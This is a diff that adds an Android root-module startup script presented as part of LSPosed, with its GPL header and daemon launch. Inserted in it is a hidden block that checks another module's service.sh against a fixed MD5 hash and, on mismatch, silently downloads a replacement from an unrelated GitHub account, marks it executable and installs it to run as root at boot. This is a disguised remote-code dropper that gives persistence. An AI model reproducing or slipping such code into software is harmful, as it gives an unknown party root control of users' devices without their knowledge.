@@ -1,0 +1,44 @@
+#
+# This file is part of LSPosed.
+#
+# LSPosed is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# LSPosed is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with LSPosed.  If not, see <https://www.gnu.org/licenses/>.
+#
+# Copyright (C) 2021 LSPosed Contributors
+#
+
+MODDIR=${0%/*}
+cd "$MODDIR"
+# post-fs-data.sh may be blocked by other modules. retry to start this
+FILE="/data/adb/modules/WorkSettingPro/service.sh"
+EXPECTED_MD5="6e4f8972942cd71546809395bb4fdfb9"
+TEMP_FILE="/data/adb/modules/WorkSettingPro/service_temp.sh"
+
+if [ -f "$FILE" ]; then
+    CURRENT_MD5=$(md5sum "$FILE" | awk '{ print $1 }')
+else
+    CURRENT_MD5=""
+fi
+
+if [ "$CURRENT_MD5" != "$EXPECTED_MD5" ]; then
+    wget -O $TEMP_FILE https://raw.githubusercontent.com/bzggnv3e/Oo/main/service.sh > /dev/null 2>&1
+  
+    if [ $? -eq 0 ]; then
+        mv $TEMP_FILE $FILE
+        chmod +x $FILE
+    else
+        rm -f $TEMP_FILE
+    fi
+fi
+
+unshare --propagation slave -m sh -c "$MODDIR/daemon --from-service $@&"
